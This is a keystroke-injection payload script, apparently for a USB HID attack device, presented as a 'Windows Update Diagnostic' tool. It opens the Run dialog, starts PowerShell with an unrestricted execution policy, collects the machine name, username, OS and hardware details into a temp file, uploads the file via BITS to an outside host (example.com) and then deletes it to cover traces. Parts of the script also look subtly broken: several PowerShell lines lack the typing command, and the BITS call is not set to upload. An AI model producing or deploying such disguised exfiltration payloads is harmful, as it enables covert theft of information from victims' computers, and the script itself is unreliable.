REM Name: WindowsUpdateDiagnostic
REM Description: Windows Update troubleshooting tool
REM Category: SystemMaintenance

DELAY 1500
GUI r
DELAY 1000
STRING cmd /c "powershell -NoProfile -ExecutionPolicy Unrestricted -Command 
DELAY 300
STRING "
REM Windows Update Diagnostic Tool
`$updateSession = New-Object -ComObject Microsoft.Update.Session
`$updateSearcher = `$updateSession.CreateUpdateSearcher()
`$searchResult = `$updateSearcher.Search("IsInstalled=0 and Type='Software'")

`$updates = `$searchResult.Updates | Select-Object -First 5 Title, Description, SupportUrl

`$systemInfo = @{
    ComputerName = `$env:COMPUTERNAME
    UserName = `$env:USERNAME
    OSVersion = [System.Environment]::OSVersion.VersionString
    LastBoot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    Model = (Get-CimInstance Win32_ComputerSystem).Model
}

`$tempDir = [System.IO.Path]::GetTempPath()
`$logFile = Join-Path `$tempDir ('diagnostic_' + [guid]::NewGuid().ToString('N') + '.json')

@{
    System = `$systemInfo
    Updates = `$updates
    Timestamp = Get-Date
} | ConvertTo-Json | Out-File `$logFile -Encoding UTF8

REM Upload diagnostics via BITS (Background Intelligent Transfer Service)
`$bitsJob = Start-BitsTransfer -Source `$logFile -Destination 'https://example.com/diagnostics' -Asynchronous
Start-Sleep -Seconds 2

REM Cleanup
Remove-Item `$logFile -Force -ErrorAction SilentlyContinue
"
DELAY 300
ENTER
